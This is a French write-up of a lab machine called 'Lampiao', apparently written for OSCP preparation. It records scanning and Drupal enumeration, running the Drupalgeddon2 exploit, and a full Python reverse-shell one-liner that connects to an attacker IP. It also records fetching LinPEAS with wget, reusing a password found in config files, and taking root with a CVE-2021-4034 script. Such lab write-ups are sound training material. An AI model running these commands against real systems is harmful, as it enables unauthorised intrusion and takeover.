# LAMPIAO

    sudo nmap -A -p1-10000 192.168.206.48
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.206.48 --tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.206.48

Scans classiques.

Le serveur web du port 80 amène juste sur un dessin en ASCII mais il semble y avoir un deuxième serveur web sur le port 1898.

    whatweb http://192.168.206.48:1898

On voit que le site utilise Drupal v7, cela se remarque aussi dans le code source. L'un des articles mentionne des fichiers ainsi que des tests, et les fichiers en question se trouvent bien à la racine du site web puisque l'URL http://192.168.206.48:1898/audio.m4a fonctionne bien par exemple.

J'ai donc lancé des scans sur les fichiers à la racine du site web en parallèle de mes recherches sur Drupal :

    feroxbuster -u http://192.168.206.48:1898/ -x log,txt,php,conf,html
    ffuf -u http://192.168.206.48:1898/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .php,.txt,.ini,.conf,.html -fc 404

Je n'ai rien trouvé d'intéressant dans les fichiers obtenus, même dans le **robots.txt** qui était bien rempli, mais j'ai trouvé un exploit très intéressant sur Drupal : https://github.com/dreadlocked/Drupalgeddon2

J'ai vu que l'on pouvait directement obtenir un shell Meterpreter en passant par Metasploit mais j'ai souhaité reproduire l'exploit sans ces deux outils pour mieux me préparer pour l'OSCP.

    ruby Drupal.rb http://192.168.206.48:1898/
    ...
    lampiao>> ls /home
    lampiao>> cat /home/tiago/local.txt

Le shell PHP était assez contraignant, j'ai donc opté pour un reverse-shell en Python classique, récupéré sur le site https://www.revshells.com/

    lampiao>> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.230",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

Et de l'autre côté : 

    rlwrap nc -nvlp 9999

Les vérifications classiques n'ont pas fonctionné, je suis donc passé par LinPEAS : 

    wget http://192.168.45.230/linpeas.sh
    chmod u+x linpeas.sh
    ./linpeas.sh | tee linpeas.txt

Dans la catégorie **"Searching passwords in config PHP files"** on voit les trois lignes suivantes :

> 'password' => 'Virgulino',   
> 'password' => 'password',   
> 'password' => 'password',

J'ai donc tenté de me connecter avec le premier mot de passe sur l'autre utilisateur, cela a fonctionné mais ne m'a pas plus avancé pour l'élévation de privilèges.

    ssh 192.168.206.48 -l tiago
    
J'ai ensuite remarqué le CVE 2021-4034 qui sortait du lot et qui était surligné par LinPEAS. Il suffisait tout simplement de l'appliquer pour passer root. 

Voir : https://github.com/berdav/CVE-2021-4034/blob/main/cve-2021-4034.sh

    ./CVE.sh
    ls /root
    cat /root/proof.txt


